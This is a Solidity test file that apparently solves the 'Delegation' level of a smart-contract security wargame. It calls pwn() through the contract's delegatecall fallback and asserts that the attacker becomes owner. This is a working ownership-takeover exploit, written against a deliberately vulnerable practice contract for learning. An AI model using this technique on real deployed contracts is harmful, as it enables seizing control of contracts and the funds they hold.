// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Delegation, Delegate} from "../../src/Delegation/Level.sol";

interface IDelegation {
  function owner() external returns(address);
}

contract DelegationTest is LevelFactory {
  IDelegation delegation;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    Delegate delegate = new Delegate(deployer);
    delegation = IDelegation(address(new Delegation(address(delegate))));
  }

  function testAttack() public {
    submitLevel("Delegation");
  }

  function _performTest() internal override {
    (bool worked,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
    assert(worked);
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    assertEq(delegation.owner(), attacker);

    return (delegation.owner() == attacker);
  }
}

